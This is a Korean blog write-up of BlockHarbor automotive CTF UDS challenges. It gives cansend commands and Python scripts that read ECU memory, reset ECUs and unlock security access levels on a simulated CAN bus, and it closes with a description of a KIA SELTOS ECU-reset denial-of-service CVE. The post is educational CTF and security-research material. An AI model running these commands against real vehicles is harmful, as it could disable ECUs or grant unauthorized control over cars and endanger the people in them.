---
title: "[Research] BlockHarbor CTF와 CVE로 알아보는 CAN / UDS 취약점 (KR)"
author: newp1ayer48
tags: [CAN, UDS, VSEC, automotive, blockharbor, car, vehicle, newp1ayer48]
date: 2025-11-20 19:00:00
categories: [Research]
cc: true
index_img: /2025/11/20/newp1ayer48/can/kr/image01.jpg
---

안녕하세요! Hackyboiz에서 가장 낮은 곳(low-level)을 맡고 있는 `newp1ayer48` 입니다! 🤸🏻‍♂️

![image01.jpg](image01.jpg)

차량 분야에서 자주 사용되고 활용되는 분야가 바로 CAN 통신입니다. 이 CAN 통신에서도 보안 취약점이 발생합니다! 이 차량 분야를 대상으로 CTF와 대회들 또한 많이 개최되고 있습니다(Defcon에서도 car hacking village가 있죠).

이번 글에서는 차량 해킹 CTF로 가장 유명한 CTF 중 하나인 BlockHarbor CTF 문제를 풀어보면서 차량 통신과 이로 인해 발생하는 보안 취약점에 대해서 알아보겠습니다!

## 1. CAN Bus & UDS

![[image02.png](https://t-shaped-person.tistory.com/51)](image02.png)

CAN 통신은 차량 내의 ECU(전자 제어 장치) 같은 장치들 간의 통신을 위해 개발된 통신 프로토콜입니다. Non-host 버스 방식으로 메시지 기반의 저수준 네트워크 통신을 사용합니다. 1983년에 개발되었기 때문에 HTTP보다 먼저 만들어진 프로토콜입니다! CAN 메시지는 기본적으로 8 Byte로 구성되고, 이를 확장한 CAN-FD는 64 Byte까지 데이터를 표현할 수 있습니다.

그리고 ISO 15765에 의해 CAN 통신에 대한 국제 표준이 지정되었습니다.

![[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)](image03.png)

UDS는 통합 진단 서비스를 의미하며, 차량 CTF와 CAN 통신을 접하다 보면 UDS라는 용어를 자주 마주칠 수 있습니다. 주로 ECU에 사용되는 진단 통신에 사용되는 프로토콜입니다. 저수준의 CAN 프로토콜 보다 고수준의 프로토콜이기 때문에 데이터 R/W 같은 다양한 기능을 사용할 수 있습니다.

또한, CAN 위에서 동작할 수 있기 때문에, CAN 메시지와 UDS 메시지와 차량 진단에 사용되는 OBD2 메시지가 혼재 되어 용어 설명이 이루어지는 편입니다. ISO 14229로 UDS에 대한 표준이 지정되었습니다.

이번에 풀 BlockHarbor CTF에서는 UDS 메시지 구조를 아는 것이 중요하기 때문에, UDS 메시지 구조에 대해서 간단히 알아보겠습니다. 위 사진처럼 UDS 메시지가 구성이 됩니다. 이중에서 각 부분에 대한 간단한 설명은 아래와 같습니다.

- CAN ID: 메시지를 송수신 할 ECU
- PCI: 주로 UDS 메시지의 길이, Flow Control 등에서 사용
- SID: 서비스 식별자
    - Sub Function Byte: SID에 세부적인 옵션
- DID: 데이터 식별자

이중 중요한 몇 가지 항목에 대해서 설명하겠습니다.

![image04.png](image04.png)

CAN ID는 ISO 15765-4에 의해서 각 ECU에 대한 CAN ID 값이 16진수로 정해져 있습니다.

`7DF`의 경우 주로 모든 ECU에 대한 브로드캐스트 또는 내부적인 기능이나 설정을 통해 ECU로 전달하는 식별자입니다. 그리고 송신의 경우 1번 ECU는 `7E0`, 2번 ECU는 `7E1`와 같이 지정되어 있습니다. 수신의 경우는 송신 값의 `+0x8`한 값으로 지정 되어 있습니다.

SID는 쉽게 이야기 해서 이런 행위(서비스)를 할 것이라고 알려주는 식별자 입니다. SID 값은 역시 표준으로 지정되어 있기 때문에, 직접 [문서](https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services)를 통해서 서비스에 해당하는 SID 값을 확인할 수 있습니다. 요청할 때 SID 값에 `+0x40`의 값이 해당하는 응답 SID 값입니다. 요청 SID 값에 해당하는 응답 값인 RSID가 잘 수신이 되었으면, 통신이 잘 이루어졌다는 것을 알 수 있습니다.

추가적으로 SID 중에서 Sub Function Byte가 포함된 명령어가 있습니다. 각 SID 요청 시, 보다 세부적인 서비스 요청을 지칭할 때 사용합니다. 이는 사용할 수도 있고 없을 수도 있기 때문에, 문서를 확인하면 알 수 있습니다.

DID는 데이터를 지칭하는 식별자 입니다. DID 값도 ISO-14229 표준에 따라 예약된 값이 많기 때문에 [문서](https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/)를 확인하여 해당하는 DID 값을 사용하면 됩니다. 가장 대표적은 DID의 예시는 바로 차대 번호에 해당하는 VIN 값인 `F190`입니다. 해당 DID 값을 SID와 함께 요청하면, SID 서비스에 해당하는 서비스를 VIN을 대상으로 동작하게 됩니다.

방금 설명한 Sub Function Byte를 사용하는 SID의 경우 DID가 필요하지 않을 경우가 존재합니다.

앞으로 풀 BlockHarbor CTF 문제를 풀 때 [SID](https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services)와 [DID](https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/) 문서 페이지를 열어 놓고, 그때마다 명령어를 찾아 문제 풀이를 하는 것이 매우 필수적입니다!

### 1.1. CAN Utils

![image05.jpg](image05.jpg)

CAN/UDS 메시지를 송수신 하기 위해서는 can-utils 도구를 이용하면 됩니다. 이 도구는 리눅스에서 CAN 프로토콜을 구현한 SocketCAN 기반의 도구입니다. 바로 아래의 예제를 보면서 설명하겠습니다.

```bash
candump -a vcan0,7E0:7FF
```

candump는 CAN/UDS 메시지를 수신 받을 수 있는 도구입니다. 원하는 CAN 네트워크 인터페이스를 지정하면, 해당 인터페이스에서 CAN 메시지를 수신 받을 수 있습니다. 위 예제에서는 CAN 메시지에 ASCII 결과를 같이 보여주는 `-a` 옵션과 ECU1에서만 데이터를 수신 받도록 `7E0` 및 `7FF` 마스킹 인자를 추가해주었습니다.

추후 문제를 풀 때에는 한 쪽 터미널에 명령어를 실행시켜서 응답을 확인하는 용도로 많이 사용합니다.

```bash
cansend vcan0 7DF#0322F190 && cansend vcan0 7E0#30000000
```

cansend는 CAN/UDS 메시지를 송신할 수 있는 도구입니다. 이 역시 원하는 CAN 네트워크 인터페이스를 대상으로 CAN 메시지를 송신할 수 있습니다. 앞으로 풀 문제에서 메시지는 이전에 설명한 UDS 포맷에 맞춰 SID, DID를 잘 구성하여 메시지를 송신하면 됩니다.

추가적으로 응답 데이터가 기본적인 CAN 메시지 길이인 8 Byte 보다 클 경우를 위해, `30000000` 같은 Flow Control 요청을 같이 보내서 모든 데이터를 수신 받는 방법도 많이 사용합니다.

이렇게 cansend로 전송한 메시지의 응답을, candump로 확인하며 CAN/UDS 통신 과정을 확인 할 수 있습니다.

## 2. Blockharbor CTF

![image06.jpg](image06.jpg)

BlockHarbor CTF는 자동차 사이버 보안 회사인 Block Harbor에서 만든 Automotive Capture the Flag(CTF) 대회입니다. 가상 CAN 인터페이스 환경과 ECU 간의 통신 시뮬레이션 환경을 구성해 놓았기 때문에, 해당 대회 문제를 통해 CAN/UDS 명령어를 실습을 편리하게 할 수 있습니다. 이런 장점으로 차량 해킹 문제를 풀 때 가장 추천되는 사이트입니다.

사이트는 크게 2개로 구성되어 있습니다. CTFd 플랫폼으로 구성된 [CTF 문제 사이트](https://proving-grounds.blockharbor.io/)와, 차량 시뮬레이션 환경을 구축한 [VSEC](https://core.ed.vsec.blockharbor.io/block/learn) 사이트가 있습니다. 만약 CAN/UDS 및 차량에 대해 처음 접한다면, 문제 사이트에서 Getting Started 문제부터 시작하는 것을 권장합니다.

![image07.png](image07.png)

[VSEC](https://core.ed.vsec.blockharbor.io/block/learn)에 접속하면 Other - Learn - SIMULATIONS에서 Proving Grounds의 우측 터미널 아이콘을 클릭하면, 다양한 환경에서 차량 시뮬레이션 환경의 터미널을 웹으로 접속할 수 있습니다. 우리는 이중에서 UDS Challenge 문제들을 풀 것이기 때문에, UDS Challenge의 터미널에 접속할 것입니다. 다른 문제를 푼다면, 다른 시뮬레이션 터미널에 접속하여 문제에 알맞은 환경을 이용하면 됩니다.

![image08.png](image08.png)

터미널 아이콘을 통해 접속하면 위처럼 tmux 쉘로 접속할 수 있습니다. 확인한 CTF 문제를 이 환경에서 풀면 됩니다.

### 2.1 tmux 설정

tmux 터미널 환경을 사용하는데 몇 가지 tmux 명령어와 설정을 통해, 더 좋은 문제 풀이 환경을 구성할 수 있습니다. 기본적으로 BlockHarbor측에서도 랜딩 페이지를 통해 기본적인 [tmux 인트로](https://cantreally.cyou/posts/how-i-use-tmux/)를 만들었습니다. 이 중 자주 사용되는 몇 가지 명령어를 설명하겠습니다.

![image09.png](image09.png)

```bash
# Terminal splitting
Ctrl + b
%

# Terminal moving
Ctrl + b
← →

# Terminal scroll
Ctrl + b
[
# End scroll
Ctrl + c
```

위 명령어와 설정들이 체감 상 자주 사용하는 명령어입니다. 특히 터미널 분할과 이동이 자주 사용됩니다. 추가적으로 원하는 설정이나 명령어는 [tmux 인트로](https://cantreally.cyou/posts/how-i-use-tmux/)를 확인하거나 검색하면 됩니다.

## 3. UDS Challenge

![image10.png](image10.png)

문제 풀이를 할 UDS Challenge는 UDS 명령어를 통해 문제에서 요구하는 동작을 수행하고, 차량 환경을 제어하는 방식으로 진행이 됩니다. 문제를 풀 때 사용되는 [SID](https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services)와 [DID](https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/)는 이전에 소개한 문서를 통해 찾을 수 있습니다.

바로 문제를 풀어보도록 하죠!

### 3.1. Simulation VIN

![image11.png](image11.png)

이 문제는 UDS를 통해 VIN을 확인하는 것입니다.

VIN(Vehicle Identification Number)은 차량 식별 번호로, 앞서 명령어를 설명할 때 잠깐 다루었습니다! 이것을 시뮬레이션 환경에서 조회하면 되는 문제입니다.

![image12.png](image12.png)

먼저 시뮬레이션 환경에서 네트워크 인터페이스를 확인하면, 가상 CAN 인터페이스인 vcan0를 확인할 수 있습니다. 해당 인터페이스를 대상으로 CAN/UDS 메시지를 송수신하면 됩니다.

![image13.png](image13.png)

```bash
# listen 7E0, 7E8, 7DF
candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF

# 03(PCI:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)
cansend vcan0 7DF#0322F190 && cansend vcan0 7E0#30000000
```

candump를 통해 브로드캐스트 및 ECU1에 대한 송수신 메시지를 확인하기 위해, 3개의 CAN ID를 추가적으로 마스킹 했습니다. 이후 VIN DID 및 식별자 읽기 요청 SID를 결합하고 메시지를 전송합니다. 응답이 ECU1에서 오기 때문에 해당 ECU로 Flow Control 요청까지 전송하면 VIN을 확인할 수 있고, flag까지 확인이 가능합니다!

```
e66fb3f67ac3:~$ candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
  vcan0  7DF   [4]  03 22 F1 90               '."..'
  vcan0  7E8   [8]  10 14 62 F1 90 66 6C 61   '..b..fla'
  vcan0  7E0   [4]  30 00 00 00               '0...'
  vcan0  7E8   [8]  21 67 7B 76 31 6E 5F 42   '!g{     '
  vcan0  7E8   [8]  22 48 6D 61 63 68 33 7D   '"      }'
```

수신 받은 메시지를 세부적으로 확인해보겠습니다.

식별자 읽기 요청(`22`)을 하니, 올바른 RSID(`62`) 응답을 확인할 수 있습니다. 이후 다량의 데이터가 응답 되는데, 해당 데이터들 앞에는 `21`, `22`와 같은 연속적인 값이 표기 됩니다. 이를 통해 연속적인 데이터임을 확인할 수 있습니다.

### 3.2. Startup Message

![image14.png](image14.png)

이 문제는 ECU restart는 하는 방법에 대해서 묻고 있습니다. 그리고 진단 정보를 `7DF`로 브로드캐스트 한다고 합니다.

![image15.png](image15.png)

```bash
# listen 7E0, 7E8, 7DF
candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF

# 02(PCI:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)
cansend vcan0 7DF#021101
```

ECU를 간단하게 Restart를 하는 방법은 바로 Reset 요청(`11`)을 보내는 것입니다. 이번 문제에서 사용하는 Reset 요청의 경우, 기본 세션(`01`) Sub Function Byte를 사용합니다. 이 때문에 별도의 DID는 사용하지 않습니다.

기본 세션으로 ECU Reset 요청을 전송하면, 해당 RSID 응답(`51`)을 확인할 수 있습니다. 이윽고 flag 정보 또한 얻을 수 있습니다!

### 3.3. Engine Trouble?

![image16.png](image16.png)

이 문제는 진단 문제 코드에 해당하는 DTC를 읽는 문제입니다. `Pxxxx-xx`라는 DTC 포맷 형식에 맞춰 flag 인증을 해야 합니다.

![image17.png](image17.png)

```bash
# listen 7E0, 7E8, 7DF
candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF

# 03(PCI:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)
cansend vcan0 7DF#03190208
```

DTC 정보 읽기 요청(`19`)을 통해서 문제를 해결할 수 있습니다. 상태 마스크를 통해 DTC 진단 코드를 확인할 수 있습니다. 세부적인 DTC Status Byte는 [AUTOSAR 문서](https://buly.kr/2UjxlRq)에서 확인할 수 있습니다.

확인된 DTC는 `P3E9F-01`입니다. DTC의 경우 차량 진단에 사용되는 OBD2에서 사용되기 때문에, 해당하는 표준인 [ISO 15031](https://piembsystech.com/iso-15031-protocol/) 문서를 참고하면 DTC 코드 해석에 대해서 알 수 있습니다.

### 3.4. Secrets in Memory?

![image18.png](image18.png)

이 문제는 주소에 대한 읽기 요청을 요구하는 문제입니다. 접근 가능한 메모리 영역은 `0xC3F80000`부터 시작한다고 합니다.

![image19.png](image19.png)

```bash
# listen 7E0, 7E8, 7DF
candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF

# 07(PCI:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)
cansend vcan0 7DF#072314C3F83000FF && cansend vcan0 7E0#30000000
```

메모리 읽기 요청(`23`)을 통해서 메모리 내 데이터를 읽을 수 있습니다.

여기서 주의할 점은 주소를 지정하기 이전에 AddressAndLengthFormatIdentifier(AALFId)에 해당하는 값(`14`)을 계산해서 사용해야 합니다. AALFId에 대한 설명은 [해당 영상](https://www.youtube.com/watch?v=s2uC4vWMU7Q&t=104s)을 참고하면 이해할 수 있습니다. 결과적으로 4바이트 주소와 1바이트 길이 포맷을 사용하도록 요청하는 `14` 값을 사용하여 255(`FF`)만큼 읽기 요청을 보내면 읽기가 가능합니다.

```python
import socket
import struct

def build_can_frame(can_id, data):
    return struct.pack("=IB3x8s", can_id, len(data), data.ljust(8, b"\x00"))

def dissect_can_frame(frame):
    can_id, dlc, data = struct.unpack("=IB3x8s", frame)
    return can_id, data[:dlc]

recvdata = ""

with socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) as p:
    p.bind(("vcan0",))
    p.settimeout(0.5)

    for addr in range(0xC3F83000, 0xC3F865ff, 0xFF):
        req_data = b"\x07\x23\x14" + addr.to_bytes(4, "big") + b"\xff"
        p.send(build_can_frame(0x7DF, req_data))

        try:
            resp_frame = p.recv(16)
            resp_id, resp_data = dissect_can_frame(resp_frame)
            if resp_data:
                recvdata += resp_data.hex()[6:]
        except socket.timeout:
            continue

        flow_control_data = b"\x30\x00\x00\x00\x00\x00\x00\x00"
        p.send(build_can_frame(0x7E0, flow_control_data))

        for i in range(36):
            try:
                resp_frame = p.recv(16)
                _, resp_data = dissect_can_frame(resp_frame)
                tempdata = resp_data.hex()[2:]
                if tempdata != "00000000000000":
                    recvdata += tempdata
            except socket.timeout:
                break

    hex_data_string = recvdata

    try:
        byte_data = bytes.fromhex(hex_data_string)
        ascii_string = byte_data.decode("ascii", errors="ignore")
        print(ascii_string)
        
    except ValueError:
        print("error")
```

위 코드를 통해 0xC3F83000 대역의 데이터들을 파싱할 수 있습니다.

CAN 통신에서는 python의 `can` 모듈을 사용하는 것이 일반적이지만, 시뮬레이션 환경에서는 `can` 모듈이 없습니다… 그렇게 때문에 `socket` 모듈로 대체하여 작성하였습니다.

python `socket` 모듈로 CAN 포맷을 표현할 때는 `=IB3x8s`를 인자로 주어야 합니다.

![image20.png](image20.png)

코드를 실행하면 메모리 상에 존재하는 flag를 확인할 수 있습니다.

### 3.5. Security Access Level 3

![image21.png](image21.png)

이번 문제는 보안 액세스 레벨 3에 암호화 알고리즘을 알아내어서, 0x1337이라는 seed 값에 해당하는 key 값을 찾는 문제입니다. 문제에서 설명한 것처럼 이번 레벨 3에서는 seed 값과 key 값의 길이는 2 byte 입니다.

![[image22.png](https://blog.naver.com/suresofttech/223327497814)](image22.png)

먼저, UDS에서 제공하는 보안 액세스 기능에 대해서 알아보겠습니다.

보안 액세스는 ECU에 대한 접근 권한을 제어하는 서비스 입니다. 레벨은 숫자가 높을 수록 높은 권한의 레벨이라고 생각하면 편합니다. 이전에 진단(`10`) 확장 세션(`03`)으로 변경한 이후에, SID `27`로 사용이 됩니다.

seed 값을 생성하고 내부 암호화 알고리즘을 통해 key를 생성합니다. 해당하는 key 값에 인증이 성공하면 액세스가 이루어지는 방식으로 통신이 이루어집니다. 여기서, key 값을 보낼 때만 접근하려는 액세스 레벨 값에 +1한 값으로 요청해야 합니다.

![image23.png](image23.png)

```bash
# listen 7E0, 7E8, 7DF
candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF

# 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)
cansend vcan0 7E0#021003

# 02(PCI:len) 27(SID:SecurityAccess) 03(Level)
cansend vcan0 7E0#022703

# 04(PCI:len) 27(SID:SecurityAccess) 04(Level+1) KEYS
cansend vcan0 7E0#042704KEYS
```

보안 액세스 인증 시퀀스에 따라서 레벨 3에 대한 인증을 진행할 수 있습니다.

우선 진단 확장 세션(`1030`)으로 변경한 이후, 보안 엑세스 레벨 3(`2703`) 요청으로 생성된 `7E53`이라는 seed 값을 확인할 수 있습니다. 이에 해당하는 key 값을 전송하면 보안 액세스 RSID(`67`)을 확인하면서, 보안 엑세스에 성공하였습니다.

암호화 알고리즘은 seed 값을 비트 반전하는 간단한 알고리즘을 사용했습니다. 그렇기 때문에 flag는 `0x1337 ^ 0xFFFF`를 한 결과로 구할 수 있습니다.

```python
 # security access level 3 pass

import socket
import struct

def build_can_frame(can_id, data):
    return struct.pack("=IB3x8s", can_id, len(data), data.ljust(8, b"\x00"))

def dissect_can_frame(frame):
    can_id, dlc, data = struct.unpack("=IB3x8s", frame)
    return can_id, data

with socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) as p:
    p.bind(("vcan0",))
    data1 = b"\x02\x10\x03\x00\x00\x00\x00\x00"
    frame1 = build_can_frame(0x7E0, data1)
    p.send(frame1)

    while True:
        frame_r = p.recv(16)
        can_id, msg_data = dissect_can_frame(frame_r)
        if can_id != 0x7E0:
            break

    data2 = b"\x02\x27\x03\x00\x00\x00\x00\x00"
    frame2 = build_can_frame(0x7E0, data2)
    p.send(frame2)

    while True:
        frame_r = p.recv(16)
        can_id, msg_data = dissect_can_frame(frame_r)
        if can_id != 0x7E0:
            break
    seed = msg_data.hex()[6:10]
    print(f"Seed: {seed}")
    
    key = f"{~int(seed, 16) & 0xFFFF:04X}"
    print(f"Keys: {key}")
    
    key_bytes = int(key, 16).to_bytes(2, 'big')
    data3 = b"\x04\x27\x04" + key_bytes + b"\x00\x00\x00"
    frame3 = build_can_frame(0x7E0, data3)
    p.send(frame3)

    while True:
        frame_r = p.recv(16)
        can_id, msg_data = dissect_can_frame(frame_r)
        if can_id != 0x7E0:
            break
    
    print("Security access level 3 unlock!") 
```

![image24.png](image24.png)

추가적으로 seed 값 확인 이후에 매우 짧은 시간에 연산한 key 값을 전송해야 합니다. 그렇기 때문에 위처럼 코드를 작성하는 것을 권장합니다(물론 손이 빠르다면 직접 할 수 있습니다).

### 3.6. Security Access Level 1

![image25.png](image25.png)

이번 문제는 `0x1A000` 대역 메모리에 대한 읽기를 통해 보안 액세스 레벨 1 암호화 알고리즘을 알아내야 합니다. flag는 0x7D0E1A5C가 seed일 때의 key 값입니다. 레벨 1의 seed 값과 key 값의 길이는 4 byte인 것을 알 수 있습니다.

희한하게 UDS Challenge에서는 레벨 1이 레벨 3보다 뒤에 배치되어 있습니다.

```python
# read memory

import socket
import struct

def build_can_frame(can_id, data):
    return struct.pack("=IB3x8s", can_id, len(data), data.ljust(8, b"\x00"))

def dissect_can_frame(frame):
    can_id, dlc, data = struct.unpack("=IB3x8s", frame)
    return can_id, dlc, data

recvdata = ""

with socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) as p:
    can_id_filter = 0x7E8
    can_mask_filter = 0xFFF
    can_filter = struct.pack("=II", can_id_filter, can_mask_filter)
    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)
    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, 0)

    p.bind(("vcan0",))

    for hex_value in range(0x1A000, 0x1B000, 0xFF):
        candata = b"\x07\x23\x14" + hex_value.to_bytes(4, "big") + b"\xff"
        
        data1 = b"\x02\x10\x02\x00\x00\x00\x00\x00"
        frame1 = build_can_frame(0x7DF, data1)
        p.send(frame1)
        
        frame_r1 = p.recv(16)
        
        frame2 = build_can_frame(0x7DF, candata)
        p.send(frame2)
        
        frame_r2 = p.recv(16)
        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)
        
        recvdata += data_r2.hex()[6:]
        
        data3 = b"\x30\x00\x00\x00\x00\x00\x00\x00"
        frame3 = build_can_frame(0x7E0, data3)
        p.send(frame3)
        
        temp = 0
        while temp < 36:
            frame_r_loop = p.recv(16)
            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)
            
            tempdata = data_loop.hex()[2:]
            
            if tempdata != "00000000000000":
                recvdata += tempdata
            temp = temp + 1

print(f"recv data: {recvdata}")
```

먼저, `0x1A000` 대역 메모리에 대한 읽기를 수행하는 코드를 작성해줍니다.

![image26.png](image26.png)

이전에 레벨 3를 인증하는 코드를 먼저 실행해서 레벨 3 인증을 통과합니다.

그 이후에 방금 작성한 메모리 읽기 코드를 실행하면, 4 byte 값이 2번 존재하는 것을 확인할 수 있습니다. 해당 값은 보안 액세스 레벨 1 요청을 통해 seed 값을 생성할 때마다 달라지는 것을 확인할 수 있습니다.

```python
>>> hex(0x983cb51b ^ 0xcd051f0c)
'0x5539aa17'
>>> hex(0xddee9870 ^ 0x88d73267)
'0x5539aa17'
>>> hex(0x4a4499ad ^ 0x1f7d33ba)
'0x5539aa17'
```

해당 값들을 XOR 연산을 하면 `0x5539aa17`이라는 고정적인 값이 나오는 것을 알 수 있습니다.

이를 통해 메모리에 seed 값과 연산한 key 값이 존재한다는 것을 알 수 있습니다. 그리고 연산 알고리즘은 `seed ^ 0x5539aa17`이라는 것 역시 알 수 있습니다.

![image27.png](image28.png)

```bash
# listen 7E0, 7E8, 7DF
candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF

# 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)
cansend vcan0 7E0#021003

# 02(PCI:len) 27(SID:SecurityAccess) 01(Level)
cansend vcan0 7E0#022701

# 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS
cansend vcan0 7E0#062702KEYSKEYS
```

알아낸 암호화 알고리즘을 통해 보안 액세스 레벨 1 인증을 시도하면, RSID(`67`)를 확인하며 성공하는 것을 알 수 있습니다.

```python
# security access level 1 pass

import socket
import struct

def build_can_frame(can_id, data):
    return struct.pack("=IB3x8s", can_id, len(data), data.ljust(8, b"\x00"))

def dissect_can_frame(frame):
    can_id, dlc, data = struct.unpack("=IB3x8s", frame)
    return can_id, data

with socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) as p:
    p.bind(("vcan0",))
    data1 = b"\x02\x10\x03\x00\x00\x00\x00\x00"
    frame1 = build_can_frame(0x7E0, data1)
    p.send(frame1)

    while True:
        frame_r = p.recv(16)
        can_id, msg_data = dissect_can_frame(frame_r)
        if can_id != 0x7E8:
            continue
        break

    data2 = b"\x02\x27\x01\x00\x00\x00\x00\x00"
    frame2 = build_can_frame(0x7E0, data2)
    p.send(frame2)

    while True:
        frame_r = p.recv(16)
        can_id, msg_data = dissect_can_frame(frame_r)
        if can_id != 0x7E8:
            continue
        break

    seed_bytes = msg_data[3:7]
    seed_int = int.from_bytes(seed_bytes, 'big')
    print(f"Seed: {seed_int:08X}")

    key_int = seed_int ^ 0x5539AA17
    print(f"Key: {key_int:08X}")

    key_bytes = key_int.to_bytes(4, 'big')
    data3 = b"\x06\x27\x02" + key_bytes
    frame3 = build_can_frame(0x7E0, data3)
    p.send(frame3)

    while True:
        frame_r = p.recv(16)
        can_id, msg_data = dissect_can_frame(frame_r)
        if can_id != 0x7E8:
            continue
        break

    print("Security access level 1 unlock!")
```

![image28.png](image28.png)

보안 액세스 레벨 1을 해제하는 코드도 역시 작성할 수 있습니다.

![image29.jpg](image29.jpg)

## 4. UDS 명령어로 발생하는 CVE

![[image30.gif](https://github.com/nitinronge91/KIA-SELTOS-Cluster-Vulnerabilities/blob/628b1550f0093f79380929074b6a5e6ca6f2d04b/CVE/Denial%20of%20Service%20via%20ECU%20Reset%20Service%20For%20KIA%20SELTOS%20CVE-2024-51072.md)](image30.gif)

BlockHarbor CTF로 배운 UDS 명령어로 보안 취약점이 발생할 수 있고, 실제로 CVE가 발급이 되는 사례가 존재합니다. 대표적으로 KIA SELTOS에서 발생한 [CVE-2024-51072](https://github.com/nitinronge91/KIA-SELTOS-Cluster-Vulnerabilities/blob/628b1550f0093f79380929074b6a5e6ca6f2d04b/CVE/Denial%20of%20Service%20via%20ECU%20Reset%20Service%20For%20KIA%20SELTOS%20CVE-2024-51072.md)입니다.

CVE-2024-51072는 UDS 명령어를 통한 DoS 취약점이 발생한 사례입니다. 바로 ECU 하드 리셋 서비스(SID:`11`)로 발생하였습니다! 차량 내부에서 UDS 명령어에 대한 검증이 부족했기 때문에, 명령어가 그대로 ECU에 전달되어 실행이 되었습니다. 이로 인해, 작동 불능 상태가 되어 버리는 DoS 취약점이 발생했습니다.

뿐만 아니라 CAN/UDS를 통한 취약점은 식별자 읽기 요청(`22`)과 다양한 진단 요청(`19` 등)을 통한 Information Leak, 보안 액세스(`27`) 우회를 통한 ECU 및 차량 내부 권한 탈취 등의 취약점이 발생할 수 있습니다. 특히, 주소 읽기 요청(`23`)에 대한 검증이 미흡하면, 내부 메모리 접근으로 펌웨어가 유출 될 수 있습니다.

따라서, CAN/UDS 메시지에 대한 엄밀한 검증과 보안 액세스의 접근 제어가 차량 보안에서 가장 기본적인 요소라고 할 수 있습니다.

다음에는 다른 임베디드 주제로 돌아오도록 하겠습니다! 감사합니다! 👋🏻